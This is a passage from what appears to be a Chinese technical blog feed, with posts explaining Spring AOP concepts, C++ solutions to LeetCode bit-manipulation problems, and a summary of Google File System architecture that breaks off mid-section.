        <content type="html"><![CDATA[<h2 id="一、定义"><a href="#一、定义" class="headerlink" title="一、定义"></a>一、定义</h2><p>AOP(Aspect Oriented Programming)，即面向切面编程，是OOP(面向对象编程)的一种延续，二者互补。<br>AOP的目的是将横切关注点(如日志记录、事务管理、权限控制、接口限流等)从核心业务中分离出来形成一个个切面(<strong>Aspect</strong>)，通过动态管理、字节码操作等技术实现代码的复用和解耦，提高代码的可维护性和可扩展性。</p><h2 id="二、关键术语"><a href="#二、关键术语" class="headerlink" title="二、关键术语"></a>二、关键术语</h2><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post22/aop-program-execution.jpg" alt="aop-program-execution"></p><ul><li><strong>横切关注点</strong>(<strong>cross-cutting concerns</strong>)：多个类或对象中的公共行为(如日志记录、事务管理、权限控制、接口限流、接口幂等等)。</li><li><strong>切面</strong>(<strong>Aspect</strong>)：对横切关注点进行封装的类，一个切面是一个类。切面可以定义多个通知，用来实现具体的功能。</li><li><strong>连接点</strong>(<strong>JoinPoint</strong>)：连接点是方法调用或者方法执行时的某个特定时刻（如方法调用、异常抛出等）。</li><li><strong>通知</strong>(<strong>Advice</strong>)：通知就是切面在某个连接点要执行的操作。通知有五种类型，分别是前置通知(Before)、后置通知(After)、返回通知(AfterReturning)、异常通知(AfterThrowing)和环绕通知(Around)。前四种通知都是在目标方法的前后执行，而环绕通知可以控制目标方法的执行过程。</li><li><strong>切点</strong>(<strong>Pointcut</strong>)：一个切点是一个表达式，它用来匹配哪些连接点需要被切面所增强。切点可以通过注解、正则表达式、逻辑运算等方式来定义。比如<code>execution(* com.xyz.service..*(..))</code>匹配<code>com.xyz.service</code>包及其子包下的类或接口。</li><li><strong>织入</strong>(<strong>Weaving</strong>)：织入是将切面和目标对象连接起来的过程，也就是将通知应用到切点匹配的连接点上。常见的织入时机有两种，分别是编译期织入(Compile-Time Weaving 如：AspectJ)和运行期织入(Runtime Weaving 如：AspectJ、Spring AOP)。</li></ul><h2 id="三、常见的通知类型"><a href="#三、常见的通知类型" class="headerlink" title="三、常见的通知类型"></a>三、常见的通知类型</h2><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post22/aspectj-advice-types.jpg" alt="aspectj-advice-types"></p><ul><li><strong>Before</strong>(<strong>前置通知</strong>)：目标对象的方法调用之前触发。</li><li><strong>After</strong>(<strong>后置通知</strong>)：目标对象的方法调用之后触发。</li><li><strong>AfterReturning</strong>(<strong>返回通知</strong>)：目标对象的方法调用完成，在返回结果值之后触发。</li><li><strong>AfterThrowing</strong>(<strong>异常通知</strong>)：目标对象的方法运行中抛出&#x2F;触发异常后触发，AfterReturning和AfterThrowing两者互斥。如果方法调用成功无异常，则会有返回值；如果方法抛出了异常，则不会有返回值。</li><li><strong>Around</strong>(<strong>环绕通知</strong>)：编程式控制目标对象的方法调用。环绕通知是所有通知类型中可操作范围最大的一种，因为它可以直接拿到目标对象，以及要执行的方法，所以环绕通知可以任意的在目标对象的方法调用前后搞事，甚至不调用目标对象的方法</li></ul><h2 id="四、应用场景"><a href="#四、应用场景" class="headerlink" title="四、应用场景"></a>四、应用场景</h2><p>OOP不能很好地处理一些分散在多个类或对象中的公共行为，这些行为通常被称为<strong>横切关注点</strong>。如果我们在每个类或对象中都重复实现这些行为，那么会导致代码的冗余、复杂和难以维护，所以才有了AOP。</p><p>下面举个简单的例子：<br>假设你有两个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createUser1</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;方法开始&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;创建用户: &quot;</span> + name);</span><br><span class="line">    System.out.println(<span class="string">&quot;方法结束&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createUser2</span><span class="params">(String name, <span class="type">int</span> id)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;方法开始&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;创建用户: &quot;</span> + name + <span class="string">&quot; &quot;</span> + String.valueOf(id));</span><br><span class="line">    System.out.println(<span class="string">&quot;方法结束&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很显然需要挨个写逻辑很烦，而且还全是重复的代码段。使用AOP技术之后，我们可以将重复的逻辑封装成一个切面，然后通过切入点和通知来指定在哪些方法需要执行指定的操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogAspect</span> &#123;</span><br><span class="line">  <span class="comment">// 切入点，所有被 Log 注解标注的方法</span></span><br><span class="line">  <span class="meta">@Pointcut(&quot;@annotation(cn.javaguide.annotation.Log)&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">webLog</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Around(&quot;webLog()&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">doAround</span><span class="params">(ProceedingJoinPoint joinPoint)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;方法开始&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> joinPoint.proceed(); <span class="comment">// 执行原方法</span></span><br><span class="line">    System.out.println(<span class="string">&quot;方法结束&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在原方法上加一行注解<code>@Log</code>即可实现重复的操作。</p><h2 id="五、实现方式"><a href="#五、实现方式" class="headerlink" title="五、实现方式"></a>五、实现方式</h2><p>一是很经典的动态代理(JDK Proxy和CGLIB Proxy)，二是字节码操作(AspectJ)。<br>动态代理之前的文章已经有讲过这里不再详细讲解，值得一提的是Spring的代理策略和SpringBoot是不一样的：</p><ul><li>Spring AOP：如果要代理的对象，实现了某个接口，那么会使用JDK Proxy，去创建代理对象，而对于没有实现接口的对象，会使用CGLIB生成一个被代理对象的子类来作为代理。</li><li>SpringBoot：Spring Boot2.0之前，默认使用JDK动态代理。2.0开始后，如果用户什么都不配置的话，默认使用CGLIB动态代理。</li></ul><p><strong>Spring AOP属于运行时增强，而AspectJ是编译时增强。</strong><br>怎么理解上面这句话呢，意思就是Spring AOP使用的是动态代理，是在运行的时候对方法进行拦截而没有改变原有类。而AspectJ是把增强部分的代码直接”写入”了原来的类，也就是说原来的类生成的二进制文件里面就已经包括了增强后的代码，已经被修改过了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(九): 位运算</title>
      <link href="/post/cdede8d5.html"/>
      <url>/post/cdede8d5.html</url>
      
        <content type="html"><![CDATA[<ul><li>常用技巧(其中0s和1s分别表示只由0或1构成的二进制数字。)：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x ^ 0s = x      x &amp; 0s = 0     x | 0s = x</span><br><span class="line">x ^ 1s = ~x     x &amp; 1s = x     x | 1s = 1s</span><br><span class="line">x ^ x = 0       x &amp; x = x      x | x = x</span><br></pre></td></tr></table></figure></li><li>除此之外，n&amp;(n-1)可以去除n的位级表示中最低的那一位，例如对于二进制表示11110100，减去1得到11110011，这两个数按位与得到11110000。n&amp;(-n)可以得到n的位级表示中最低的那一位，例如对于二进制表示11110100，取负得到00001100，这两个数按位与得到00000100。</li></ul><h2 id="一、位运算基础问题"><a href="#一、位运算基础问题" class="headerlink" title="一、位运算基础问题"></a>一、位运算基础问题</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/hamming-distance">汉明距离</a><br>给定两个十进制数字，求它们二进制表示的汉明距离(Hamming distance，即不同位的个数)。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> temp = x ^ y;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (temp &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp &amp; <span class="number">1</span>)</span><br><span class="line">                ++count;</span><br><span class="line">            temp &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：异或运算的本质就是算有多少位不同的。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/reverse-bits">颠倒二进制位</a><br>给定一个十进制正整数，输出它在二进制下的翻转结果。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reverseBits</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i) &#123;</span><br><span class="line">            res |= (n &amp; <span class="number">0x1</span>) &lt;&lt; (<span class="number">31</span> - i);</span><br><span class="line">            n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：使用左移和右移运算来对齐位数，使用或运算来实现”相加”。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/single-number">只出现一次的数字</a><br>给定一个整数数组，这个数组里只有一个数次出现了一次，其余数字出现了两次，求这个只出现一次的数字。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">singleNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; nums.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            res ^= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：两个相同的数做异或运算结果为0，0和任何数做异或运算结果为那个数本身，根据这个的性质很好求解。</p></li></ul><h2 id="二、二进制特性"><a href="#二、二进制特性" class="headerlink" title="二、二进制特性"></a>二、二进制特性</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/maximum-product-of-word-lengths">最大单词长度乘积</a><br>给定多个字母串，求其中任意两个字母串的长度乘积的最大值，且这两个字母串不能含有相同字母。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProduct</span><span class="params">(vector&lt;string&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; map;</span><br><span class="line">        <span class="type">int</span> max_len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> string&amp; word : words) &#123;</span><br><span class="line">            <span class="type">int</span> mask = <span class="number">0</span>, word_len = word.<span class="built_in">length</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : word) mask |= <span class="number">1</span> &lt;&lt; (c - <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            map[mask] = <span class="built_in">max</span>(map[mask], word_len);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; [i, j] : map) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((mask &amp; i) == <span class="number">0</span>)</span><br><span class="line">                    max_len = <span class="built_in">max</span>(max_len, map[mask] * j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max_len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：主要是理解这个mask，用26位二进制来表示一个单词出现了哪些字母，同时可以用一个map来记录mask对应的单词最长长度，比如ab和aab会记录aab的长度。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/counting-bits">比特位计数</a><br>给定一个非负整数n，求从0到n的所有数字的二进制表达中，分别有多少个1。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">countBits</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">res</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            res[i] = res[i &gt;&gt; <span class="number">1</span>] + (i &amp; <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意二进制的性质，乘以二时末尾只会多一个0，根据这个性质来求解。</p></li></ul><h2 id="三、练习"><a href="#三、练习" class="headerlink" title="三、练习"></a>三、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/missing-number">丢失的数字</a><br>给定一个包含[0, n]中n个数的数组nums，找出[0, n]这个范围内没有出现在数组中的那个数。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">missingNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) res ^=  i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) res ^= nums[i];</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：本质上和找到只出现一次的数字是一道题。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/binary-number-with-alternating-bits">交替位二进制数</a><br>给定一个正整数，检查它的二进制表示是否总是0、1交替出现：换句话说，就是二进制表示中相邻两位的数字永不相同。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasAlternatingBits</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> last = n &amp; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ((n &amp; <span class="number">1</span>) == last) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            last = n &amp; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：没啥好说的，挺简单的一道题。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/number-complement">数字的补数</a><br>对整数的二进制表示取反(0变1，1变0)后，再转换为十进制表示，可以得到这个整数的补数。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findComplement</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((num &gt;&gt; i) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">bool</span> last = (num &gt;&gt; i) &amp; <span class="number">1</span>;</span><br><span class="line">            res |= (!last) &lt;&lt; (i++);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意不能直接使用~运算，会变成负数。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/single-number-iii">只出现一次的数字 III</a><br>给定一个整数数组，这个数组里只有两个数次出现了一次，其余数字出现了两次，求这两个只出现一次的数字。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">singleNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> xorAll = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums)</span><br><span class="line">            xorAll ^= num;</span><br><span class="line">        xorAll &amp;= -xorAll;</span><br><span class="line">        <span class="type">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (num &amp; xorAll) a ^= num;</span><br><span class="line">            <span class="keyword">else</span> b ^= num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;a, b&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：需要深刻理解异或运算的含义是有哪几位不同，通过某一位的不同我们可以把数字分为两组，这一位为1或者是不为1的，而因为其他数字都会出现两次抵消为0，所以最后剩下的两个数字即为出现了一次的数字。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google的三架马车: GFS, MapReduce, BigTable</title>
      <link href="/post/2b77d569.html"/>
      <url>/post/2b77d569.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、GFS-Google-File-System"><a href="#一、GFS-Google-File-System" class="headerlink" title="一、GFS(Google File System)"></a>一、GFS(Google File System)</h2><h3 id="1-1-GFS简述"><a href="#1-1-GFS简述" class="headerlink" title="1.1 GFS简述"></a>1.1 GFS简述</h3><p>GFS是Google在2003年前后创建的<strong>可扩展分布式文件系统</strong>，用来满足Google不断扩展的数据处理需求。为大型网络和连接的节点提供容错、可靠性、可扩展性、可用性和性能。GFS由多个由低成本商品硬件组件构建的存储系统组成(使用了<strong>集群</strong>的概念，联合了多个硬件)，它经过优化以适应Google的不同数据使用和存储需求，例如其搜索引擎会生成大量必须存储的数据。</p><h3 id="1-2-GFS的特点"><a href="#1-2-GFS的特点" class="headerlink" title="1.2 GFS的特点"></a>1.2 GFS的特点</h3><ul><li>由许多经常出现问题的廉价硬件构建而成。但是能不断地监控自己，并在常规的基础上及时<strong>发现、容忍和恢复组件故障</strong>。</li><li>存储着非常多的大文件，对大文件进行了管理优化。</li><li>对<strong>大文件顺序流式读写操作</strong>进行了优化以及对<strong>小文件随机读取</strong>进行了批处理和排序等优化。</li><li>任何一个客户端都可以访问到存储在不同硬件上的某个文件，支持对文件的<strong>并行处理</strong>(同时读，同时写，边读边写)，因此原子性操作以及允许把一个大文件切片存在不同的硬件上也是必不可少的。</li><li><strong>高持续带宽</strong>比低延迟更重要。因为目标应用大多偏重于处理大批量、高速率的数据，而很少有针对单个读或写的严格响应时间要求。</li></ul><h3 id="1-3-GFS的架构"><a href="#1-3-GFS的架构" class="headerlink" title="1.3 GFS的架构"></a>1.3 GFS的架构</h3><p>主要是以下几个特点：</p><ul><li>由单个主服务器和多个块服务器组成，由多个客户端访问。</li><li>文件被划分为固定大小的块，一般为64MB。</li><li>为了保证可靠性，每个组块在多个组块服务器上进行复制，默认情况下会复制三份。</li><li>主服务器维护所有文件系统元数据。这包括命名空间、访问控制信息、文件到组块的映射以及组块的当前位置。</li><li>客户端与主服务器交互进行元数据操作，但所有的数据承载通信都直接交给组块服务器。</li></ul><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post20/613da191f0181d5b2791148620ae7f85.png" alt="GFS架构"><br>可以看到客户端向主服务器发送文件访问请求，而主服务器只返回了文件句柄和所在的服务器位置，然后客户端拿着这个数据去向返回过来的数据块服务器地址要数据。</p><h4 id="1-3-1-单主模式"><a href="#1-3-1-单主模式" class="headerlink" title="1.3.1 单主模式"></a>1.3.1 单主模式</h4><ul><li><p>优点：极大地简化了GFS设计，因为单一主机可以使用全局知识做出复杂的块放置和复制决策。</p></li><li><p>缺点：</p><ul><li>单点故障。需要定期的将关键元数据检查点放到非易失性存储中。</li><li>可能是系统的<strong>性能瓶颈点</strong>。必须尽量减少主服务器参与读写的操作。</li></ul><p>对于第二点，在架构图中我们可以发现，客户端从来不通过主服务器进行读取和写入文件数据。客户端会先询问主服务器他应该联系哪个块服务器，在限定的时间内缓存此信息(指应该联系的块服务器的信息)，并直接与块服务器交互以进行读写操作。</p></li></ul><h4 id="1-3-2-块大小"><a href="#1-3-2-块大小" class="headerlink" title="1.3.2 块大小"></a>1.3.2 块大小</h4><p>块大小选择了64MB，它比典型的文件系统块大得多。每个数据块副本以普通Linux文件的形式存储在一个数据块服务器上，并根据需要进行扩展。</p><ul><li><p>优点：</p><ul><li>减少了客户端与主端<strong>交互</strong>的需求，因为对同一块进行读写操作只需要向主端发出一个初始请求即可获得块位置信息。</li><li>在一个大的数据块上，客户端更有可能在给定的数据块上执行许多操作，因此可以通过在较长时间内保持与数据块服务器的持久TCP连接来<strong>减少网络开销</strong>。</li><li>减少了存储在主节点上的元数据的大小。这使得我们可以将元数据保存在<strong>内存</strong>中。</li></ul></li><li><p>缺点：一个大块量度，即使有懒惰的空间分配，也有它的缺点。</p><ul><li>小文件的<strong>碎片化存储</strong>浪费空间。</li><li>如果有多个客户端访问同一个文件，那么存储这些数据块的数据块服务器可能会有多个并发请求导致<strong>请求过载</strong>。</li></ul><p>对于第二点，可以通过将这些可执行文件以更多的复制因子存储，并使批处理系统错开应用程序的启动时间来解决这个问题。还有一个潜在的长期解决方案是允许客户在这种情况下从其他客户那里读取数据。</p></li></ul><h4 id="1-3-3-元数据"><a href="#1-3-3-元数据" class="headerlink" title="1.3.3 元数据"></a>1.3.3 元数据</h4><p>元数据存储在主内存中(块大小的优点提到了)，而数据存储在块服务器中。这使得主服务器操作非常快，并且还允许主服务器在后台通过其整个状态有效地执行定期扫描。周期性扫描用于实现块垃圾收集、块迁移等。</p><p>主服务器存储以下三种元数据：</p><ul><li><strong>文件和Chunk的命名空间</strong>。</li><li><strong>文件和Chunk的对应关系</strong>。</li><li><strong>每个Chunk副本的存放地点</strong>。</li></ul><p>请注意，前两种类型的元数据通过将更改记录存储到主服务器本地磁盘上的操作日志中来保持持久性，并定期复制到远程机器。但是，主服务器不会持久存储块位置信息。相反，它会在主服务器启动时以及当有块服务器加入集群时询问每个块服务器关于它的块数据。这是因为块服务器是块位置和主要状态信息的权威数据源。</p><h4 id="1-3-4-一致性模型"><a href="#1-3-4-一致性模型" class="headerlink" title="1.3.4 一致性模型"></a>1.3.4 一致性模型</h4><p>GFS有一个宽松的一致性模型，也可以称之为弱一致性模型，它很好地支持高度分布式应用，但仍然保持相对简单和高效的实现。</p><p>论文中作者描述了文件区域的两种状态：</p><ul><li>如果所有客户端，无论从哪个副本读取，读到的数据都一样，那么我们认为文件region是“一致的”；</li><li>如果对文件的数据修改之后，region是一致的，并且客户端能够看到写入操作全部的内容，那么这个region是“已定义的”。</li></ul><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post20/3bebfdae7b0aef059c91d5e6a127fa99.png" alt="两种状态"></p><p>其他操作：</p><ul><li><strong>原子操作</strong>：<br>GFS提供了一些原子操作。文件命名，空间修改例如文件创建都是原子性的，并且由主服务器专门处理。命名空间锁(Namespace locking)保证了原子性，主服务器的操作日志定义了这些操作的全局顺序。</li><li><strong>记录追加</strong>：<br>与常规的写入操作或者最佳操作相比，GFS提供了记录追加操作，即使存在并发冲突的情况下，也能够保证要追加的数据至少以原子操作的方式执行一次，但以GFS选择的偏移量(offset)。GFS将会返回这个追加数据的偏移量给客户端(并不能避免冲突，但是让冲突变得可容忍)。</li></ul><h3 id="1-4-总结"><a href="#1-4-总结" class="headerlink" title="1.4 总结"></a>1.4 